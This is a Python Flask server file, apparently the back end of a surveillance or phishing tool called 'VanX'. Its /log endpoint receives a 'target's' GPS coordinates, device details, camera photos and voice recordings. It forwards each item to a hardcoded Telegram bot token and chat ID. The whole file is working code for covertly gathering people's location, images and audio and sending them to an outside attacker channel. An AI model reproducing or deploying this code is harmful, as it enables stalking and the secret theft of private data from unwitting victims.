import os
import base64
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# --- APNI DETAILS YAHAN CHECK KAREIN ---
BOT_TOKEN = "8517364051:AAFUprGh5HLg101v11PUWiPxGXsu6D8gQY0"
CHAT_ID = "8450988216"

def send_telegram(message=None, photo_path=None, audio_path=None):
    if photo_path:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'photo': photo})
    
    if audio_path:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        with open(audio_path, 'rb') as audio:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'audio': audio})

    if message:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': CHAT_ID, 'text': message})

@app.route('/')
def index():
    return "VanX Server Active"

@app.route('/log', methods=['POST'])
def log_data():
    data = request.json
    data_type = data.get('type')

    # 1. Location handle karna
    if data_type == 'info':
        lat = data.get('lat')
        lon = data.get('lon')
        dev = data.get('device')
        msg = f"📍 *Target Found!*\n\nDevice: {dev}\nLocation: {lat}, {lon}\nMaps: https://www.google.com/maps?q={lat},{lon}"
        send_telegram(message=msg)

    # 2. Photo handle karna
    elif data_type == 'image':
        img_base64 = data.get('image').split(',')[1]
        with open("capture.jpg", "wb") as f:
            f.write(base64.b64decode(img_base64))
        send_telegram(photo_path="capture.jpg")
        if os.path.exists("capture.jpg"):
            os.remove("capture.jpg")

    # 3. Audio handle karna (YE WALA PART MISSING THA)
    elif data_type == 'audio':
        audio_base64 = data.get('audio').split(',')[1]
        with open("voice.ogg", "wb") as f:
            f.write(base64.b64decode(audio_base64))
        send_telegram(audio_path="voice.ogg")
        if os.path.exists("voice.ogg"):
            os.remove("voice.ogg")

    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
